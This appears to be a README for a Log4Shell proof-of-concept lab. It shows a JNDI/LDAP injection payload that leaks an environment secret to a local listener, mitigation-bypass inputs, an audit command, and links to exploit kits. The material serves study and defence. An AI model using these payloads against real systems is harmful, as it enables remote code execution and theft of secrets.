Log4j vulnerability exploration/proof of concept
================================================
Also known as CVE-2021-45046 CVE-20201-44228 #log4shell

https://logging.apache.org/log4j/2.x/security.html

How to use
===============================================
First verify that it works by running `test.sh` it should print ITWORKS in uppercase for different log levels


Exfiltration example
---------------------
```
cd listener
./ldap-exfil.py
```
in another terminal run the following and observe the secret key value being leaked to the ldap server
```
export SECRET_KEY="this_is_a_secret_key"
./vuln.sh error '${jndi:ldap://localhost:8888/${env:SECRET_KEY}}'
```


Mitigation bypass
------------------
You can compare the behaviour of the printf call to the others via:
```
./mitigator-vuln.sh error '${upper:bypass}'
./mitigator-vuln.sh info '${upper:bypass}'
./mitigator-vuln.sh printf '${upper:bypass}'
```

Audit source for log4j usage
----------------------------
```
graudit -d ./log4shell.db <file_or_dir>
```
And don't forget to look for the class files (recursively through jar/war/zip files)

Links
------------------
Thanks to all those who shared stuff before me, some of the links below.
https://github.com/pimps/JNDI-Exploit-Kit
https://github.com/leonjza/log4jpwn
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
https://github.com/kmindi/log4shell-vulnerable-app/`
